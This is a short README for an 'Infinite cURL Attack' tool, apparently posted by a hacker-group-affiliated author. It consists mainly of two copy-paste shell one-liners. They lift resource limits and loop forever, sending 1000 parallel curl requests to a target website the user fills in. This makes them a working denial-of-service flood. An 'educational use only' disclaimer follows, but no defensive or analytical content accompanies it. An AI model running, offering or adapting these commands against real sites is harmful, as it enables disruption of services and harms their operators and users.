<img src="https://i.pinimg.com/originals/23/a1/1f/23a11f14ab93d3ed4541960141e380ad.gif" width="200" alt="Security Tools by gh0$t. Affiliation : Anonymous (hacker group, global)." title="Security Tools by gh0$t. Affiliation : Anonymous (hacker group, global)." />  

# Infinite_cURL_Attack
Infinite cURL Attack

**USAGE** : Copy-Paste-Edit the following code (replace **_https://Your.Target.Website.com_** with your target website) in the Terminal/CMD & press Enter.  

```
ulimit -t unlimited; ulimit -f unlimited; ulimit -m unlimited; ulimit -u unlimited; ulimit -n 1000000; ulimit -s unlimited; ulimit -v unlimited; while (true); do seq 1 1000 | xargs -n1 -P 1000 curl -I -i -v -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com"; done;
```  

If you don't want logs in your terminal and make the attacks faster, do this (**the following is my preference**):  

```
ulimit -t unlimited; ulimit -f unlimited; ulimit -m unlimited; ulimit -u unlimited; ulimit -n 1000000; ulimit -s unlimited; ulimit -v unlimited; while (true); do seq 1 1000 | xargs -n1 -P 1000 curl -s -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com" > /dev/null; done;
```  

**IMPORTANT:**  
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!  
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.  
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
